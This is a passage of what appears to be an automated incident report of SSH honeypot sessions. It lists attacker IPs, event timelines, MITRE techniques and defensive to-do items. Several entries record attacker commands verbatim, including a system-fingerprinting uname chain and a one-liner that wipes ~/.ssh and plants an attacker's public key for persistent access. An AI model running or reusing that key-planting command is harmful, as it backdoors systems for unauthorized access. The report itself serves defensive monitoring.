| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:10:39` | `cowrie.session.connect` |
| `2026-07-31 07:10:39` | `cowrie.client.version` |
| `2026-07-31 07:10:39` | `cowrie.client.kex` |
| `2026-07-31 07:10:41` | `cowrie.login.success` |
| `2026-07-31 07:10:42` | `cowrie.session.params` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.command.success` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.command.input` |
| `2026-07-31 07:10:42` | `cowrie.log.closed` |
| `2026-07-31 07:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee4fc37f79b

| Field | Detail |
|---|---|
| **Source IP** | `103.68.52[.]210` |
| **First Seen** | 2026-07-31 07:12 |
| **Last Seen** | 2026-07-31 07:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:12:40` | `cowrie.session.connect` |
| `2026-07-31 07:12:41` | `cowrie.client.version` |
| `2026-07-31 07:12:41` | `cowrie.client.kex` |
| `2026-07-31 07:12:44` | `cowrie.login.success` |
| `2026-07-31 07:12:44` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.52[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.68.52[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5bc74997c53

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-31 07:13 |
| **Last Seen** | 2026-07-31 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:13:05` | `cowrie.session.connect` |
| `2026-07-31 07:13:05` | `cowrie.client.version` |
| `2026-07-31 07:13:05` | `cowrie.client.kex` |
| `2026-07-31 07:13:05` | `cowrie.login.success` |
| `2026-07-31 07:13:06` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:13:06` | `cowrie.direct-tcpip.data` |
| `2026-07-31 07:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1b0e8e32cde

| Field | Detail |
|---|---|
| **Source IP** | `91.134.138[.]62` |
| **First Seen** | 2026-07-31 07:15 |
| **Last Seen** | 2026-07-31 07:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:15:04` | `cowrie.session.connect` |
| `2026-07-31 07:15:04` | `cowrie.client.version` |
| `2026-07-31 07:15:04` | `cowrie.client.kex` |
| `2026-07-31 07:15:05` | `cowrie.login.success` |
| `2026-07-31 07:15:05` | `cowrie.session.params` |
| `2026-07-31 07:15:05` | `cowrie.command.input` |
| `2026-07-31 07:15:05` | `cowrie.command.failed` |
| `2026-07-31 07:15:05` | `cowrie.log.closed` |
| `2026-07-31 07:15:06` | `cowrie.session.params` |
| `2026-07-31 07:15:06` | `cowrie.command.input` |
| `2026-07-31 07:15:06` | `cowrie.session.file_download` |
| `2026-07-31 07:15:06` | `cowrie.log.closed` |
| `2026-07-31 07:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.138[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.134.138[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc821a1eaf2

| Field | Detail |
|---|---|
| **Source IP** | `91.134.138[.]62` |
| **First Seen** | 2026-07-31 07:15 |
| **Last Seen** | 2026-07-31 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:15:06` | `cowrie.session.connect` |
| `2026-07-31 07:15:06` | `cowrie.client.version` |
| `2026-07-31 07:15:07` | `cowrie.client.kex` |
| `2026-07-31 07:15:07` | `cowrie.login.success` |
| `2026-07-31 07:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.138[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.134.138[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7cc2136568f

| Field | Detail |
|---|---|
| **Source IP** | `91.134.138[.]62` |
| **First Seen** | 2026-07-31 07:15 |
| **Last Seen** | 2026-07-31 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:15:07` | `cowrie.session.connect` |
| `2026-07-31 07:15:07` | `cowrie.client.version` |
| `2026-07-31 07:15:07` | `cowrie.client.kex` |
| `2026-07-31 07:15:08` | `cowrie.login.success` |
| `2026-07-31 07:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.138[.]62` to AbuseIPDB if not already reported
- [ ] Block `91.134.138[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-533cb45cb0c9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:15 |
| **Last Seen** | 2026-07-31 07:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:15:15` | `cowrie.session.connect` |
| `2026-07-31 07:15:16` | `cowrie.client.version` |
| `2026-07-31 07:15:16` | `cowrie.client.kex` |
| `2026-07-31 07:15:19` | `cowrie.login.success` |
| `2026-07-31 07:15:22` | `cowrie.session.params` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:22` | `cowrie.command.success` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:22` | `cowrie.command.input` |
| `2026-07-31 07:15:24` | `cowrie.log.closed` |
| `2026-07-31 07:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11990e4b5470

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:17 |
| **Last Seen** | 2026-07-31 07:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:17:19` | `cowrie.session.connect` |
| `2026-07-31 07:17:19` | `cowrie.client.version` |
| `2026-07-31 07:17:19` | `cowrie.client.kex` |
| `2026-07-31 07:17:21` | `cowrie.login.success` |
| `2026-07-31 07:17:23` | `cowrie.session.params` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.command.success` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.command.input` |
| `2026-07-31 07:17:23` | `cowrie.log.closed` |
| `2026-07-31 07:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd451fca1bc

| Field | Detail |
|---|---|
| **Source IP** | `119.152.102[.]54` |
| **First Seen** | 2026-07-31 07:18 |
| **Last Seen** | 2026-07-31 07:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:18:47` | `cowrie.session.connect` |
| `2026-07-31 07:18:50` | `cowrie.client.version` |
| `2026-07-31 07:18:50` | `cowrie.client.kex` |
| `2026-07-31 07:18:53` | `cowrie.login.success` |
| `2026-07-31 07:18:53` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.102[.]54` to AbuseIPDB if not already reported
- [ ] Block `119.152.102[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0b4878eb09d

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-07-31 07:19 |
| **Last Seen** | 2026-07-31 07:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:19:11` | `cowrie.session.connect` |
| `2026-07-31 07:19:11` | `cowrie.client.version` |
| `2026-07-31 07:19:11` | `cowrie.client.kex` |
| `2026-07-31 07:19:14` | `cowrie.login.success` |
| `2026-07-31 07:19:14` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5da6d53d98c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:21 |
| **Last Seen** | 2026-07-31 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:21:03` | `cowrie.session.connect` |
| `2026-07-31 07:21:03` | `cowrie.client.version` |
| `2026-07-31 07:21:03` | `cowrie.client.kex` |
| `2026-07-31 07:21:03` | `cowrie.login.success` |
| `2026-07-31 07:21:04` | `cowrie.session.params` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.command.success` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.command.input` |
| `2026-07-31 07:21:04` | `cowrie.log.closed` |
| `2026-07-31 07:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c4a7c8ddb6

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-07-31 07:22 |
| **Last Seen** | 2026-07-31 07:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:22:56` | `cowrie.session.connect` |
| `2026-07-31 07:22:56` | `cowrie.client.version` |
| `2026-07-31 07:22:56` | `cowrie.client.kex` |
| `2026-07-31 07:22:58` | `cowrie.login.success` |
| `2026-07-31 07:22:58` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c56dd8e4f5

| Field | Detail |
|---|---|
| **Source IP** | `106.89.60[.]76` |
| **First Seen** | 2026-07-31 07:23 |
| **Last Seen** | 2026-07-31 07:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:23:04` | `cowrie.session.connect` |
| `2026-07-31 07:23:05` | `cowrie.client.version` |
| `2026-07-31 07:23:05` | `cowrie.client.kex` |
| `2026-07-31 07:23:08` | `cowrie.login.success` |
| `2026-07-31 07:23:10` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.60[.]76` to AbuseIPDB if not already reported
- [ ] Block `106.89.60[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5898c2db2bf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:24 |
| **Last Seen** | 2026-07-31 07:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:24:13` | `cowrie.session.connect` |
| `2026-07-31 07:24:13` | `cowrie.client.version` |
| `2026-07-31 07:24:13` | `cowrie.client.kex` |
| `2026-07-31 07:24:15` | `cowrie.login.success` |
| `2026-07-31 07:24:16` | `cowrie.session.params` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:16` | `cowrie.command.success` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:16` | `cowrie.command.input` |
| `2026-07-31 07:24:17` | `cowrie.log.closed` |
| `2026-07-31 07:24:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1918b6562569

| Field | Detail |
|---|---|
| **Source IP** | `107.189.27[.]179` |
| **First Seen** | 2026-07-31 07:25 |
| **Last Seen** | 2026-07-31 07:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:25:04` | `cowrie.session.connect` |
| `2026-07-31 07:25:04` | `cowrie.client.version` |
| `2026-07-31 07:25:04` | `cowrie.client.kex` |
| `2026-07-31 07:25:04` | `cowrie.login.success` |
| `2026-07-31 07:25:05` | `cowrie.session.params` |
| `2026-07-31 07:25:05` | `cowrie.command.input` |
| `2026-07-31 07:25:05` | `cowrie.command.failed` |
| `2026-07-31 07:25:05` | `cowrie.log.closed` |
| `2026-07-31 07:25:06` | `cowrie.session.params` |
| `2026-07-31 07:25:06` | `cowrie.command.input` |
| `2026-07-31 07:25:06` | `cowrie.session.file_download` |
| `2026-07-31 07:25:06` | `cowrie.log.closed` |
| `2026-07-31 07:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.189.27[.]179` to AbuseIPDB if not already reported
- [ ] Block `107.189.27[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12eb5eea18f2

| Field | Detail |
|---|---|
| **Source IP** | `107.189.27[.]179` |
| **First Seen** | 2026-07-31 07:25 |
| **Last Seen** | 2026-07-31 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:25:06` | `cowrie.session.connect` |
| `2026-07-31 07:25:06` | `cowrie.client.version` |
| `2026-07-31 07:25:06` | `cowrie.client.kex` |
| `2026-07-31 07:25:07` | `cowrie.login.success` |
| `2026-07-31 07:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.189.27[.]179` to AbuseIPDB if not already reported
- [ ] Block `107.189.27[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0974da53dd7

| Field | Detail |
|---|---|
| **Source IP** | `107.189.27[.]179` |
| **First Seen** | 2026-07-31 07:25 |
| **Last Seen** | 2026-07-31 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:25:07` | `cowrie.session.connect` |
| `2026-07-31 07:25:07` | `cowrie.client.version` |
| `2026-07-31 07:25:07` | `cowrie.client.kex` |
| `2026-07-31 07:25:07` | `cowrie.login.success` |
| `2026-07-31 07:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.189.27[.]179` to AbuseIPDB if not already reported
- [ ] Block `107.189.27[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617932e02f3d

| Field | Detail |
|---|---|
| **Source IP** | `47.236.161[.]139` |
| **First Seen** | 2026-07-31 07:26 |
| **Last Seen** | 2026-07-31 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:26:04` | `cowrie.session.connect` |
| `2026-07-31 07:26:04` | `cowrie.client.version` |
| `2026-07-31 07:26:04` | `cowrie.client.kex` |
| `2026-07-31 07:26:05` | `cowrie.login.success` |
| `2026-07-31 07:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.161[.]139` to AbuseIPDB if not already reported
- [ ] Block `47.236.161[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cfa44a30123

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-31 07:26 |
| **Last Seen** | 2026-07-31 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:26:06` | `cowrie.session.connect` |
| `2026-07-31 07:26:06` | `cowrie.client.version` |
| `2026-07-31 07:26:06` | `cowrie.client.kex` |
| `2026-07-31 07:26:06` | `cowrie.login.success` |
| `2026-07-31 07:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac1317bd377

| Field | Detail |
|---|---|
| **Source IP** | `14.103.117[.]86` |
| **First Seen** | 2026-07-31 07:26 |
